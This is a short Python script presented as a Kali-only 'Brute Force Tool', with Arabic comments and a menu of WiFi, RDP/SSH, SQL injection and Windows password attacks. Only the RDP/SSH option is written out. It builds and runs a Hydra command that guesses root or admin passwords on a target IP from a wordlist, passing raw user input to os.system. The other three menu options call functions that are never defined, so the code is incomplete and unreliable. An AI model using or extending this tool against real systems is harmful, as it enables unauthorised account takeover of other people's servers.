import os
import platform

def check_kali():
    # التحقق إذا كان النظام هو Kali Linux
    system_platform = platform.system().lower()
    if system_platform != 'linux' or 'kali' not in platform.uname().release.lower():
        print("This tool is designed to run only on Kali Linux.")
        exit()

def rdp_ssh_attack():
    print("Starting RDP/SSH Attack...")
    target = input("Enter target IP: ")
    protocol = input("Choose protocol (SSH/RDP): ").lower()
    wordlist = input("Enter path to wordlist: ")

    # تحديد مسار Hydra داخل Kali (سيتم العثور عليها في PATH إذا كانت مثبتة)
    hydra_path = "hydra"

    if protocol == "ssh":
        command = f"{hydra_path} -l root -P {wordlist} ssh://{target}"
    elif protocol == "rdp":
        command = f"{hydra_path} -t 4 -V -l admin -P {wordlist} rdp://{target}"

    os.system(command)

def main():
    check_kali()  # التأكد من أن الأداة تعمل فقط على Kali Linux
    print("Welcome to the Brute Force Tool!")
    
    while True:
        print("Select attack:")
        print("1. WiFi")
        print("2. RDP/SSH")
        print("3. SQL Injection")
        print("4. Windows Passwords")
        print("5. Exit")
        
        choice = input("Enter your choice: ")
        
        if choice == "1":
            wifi_attack()
        elif choice == "2":
            rdp_ssh_attack()
        elif choice == "3":
            sql_injection()
        elif choice == "4":
            windows_password()
        elif choice == "5":
            print("Exiting...")
            break
        else:
            print("Invalid choice, try again!")

if __name__ == "__main__":
    main()
